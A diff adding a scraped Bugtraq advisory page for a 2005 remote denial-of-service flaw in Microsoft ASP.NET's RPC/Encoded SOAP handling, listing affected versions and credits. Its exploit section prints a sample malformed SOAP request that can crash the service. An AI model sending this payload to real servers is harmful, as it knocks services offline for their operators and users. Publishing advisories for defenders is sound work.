@@ -1,0 +1,110 @@
+#SpeeDr00t@Black Falcon<br>#bid14217<p><b><span style="font-size: 18pt;">Microsoft ASP.NET RPC/Encoded Remote Denial Of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14217/info">info</a><br><a href="http://www.securityfocus.com/bid/14217/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14217/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14217/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14217/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				14217
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 12 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Bryan Sullivan &lt;bsullivan@spidynamics.com&gt; is credited with the discovery of this vulnerability, and Sacha Faust &lt;sfaust@spidynamics.com&gt; is credited for further research.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Microsoft ASP.NET  1.1 SP1<br/>
+					
+				
+					Microsoft ASP.NET  1.1<br/>
+					
+				
+					Microsoft ASP.NET  1.0 SP2<br/>
+					
+				
+					Microsoft ASP.NET  1.0 SP1<br/>
+					
+				
+					Microsoft ASP.NET  1.0<br/>
+					
+				
+					Microsoft ASP.NET  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required. The following XML request is an example of a request that may trigger this vulnerability:<br/><br/>&lt;?xml version="1.0" encoding="utf-16"?&gt;<br/>&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"<br/>xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"<br/>xmlns:tns="http://tempuri.org/"<br/>xmlns:types="http://tempuri.org/encodedTypes"<br/>xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"<br/>xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;<br/>  &lt;soap:Body<br/>soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;<br/>    &lt;tns:Test&gt;<br/>      &lt;someList href="#id1" /&gt;<br/>    &lt;/tns:Test&gt;<br/>    &lt;tns:ArrayOfInt&gt;<br/>      &lt;Item&gt;0&lt;/Item&gt;<br/>    &lt;/tns:ArrayOfint&gt;<br/>  &lt;/soap:Body&gt;<br/>&lt;/soap:Envelope&gt;
+	
+		<ul>
+</ul>
+</div>
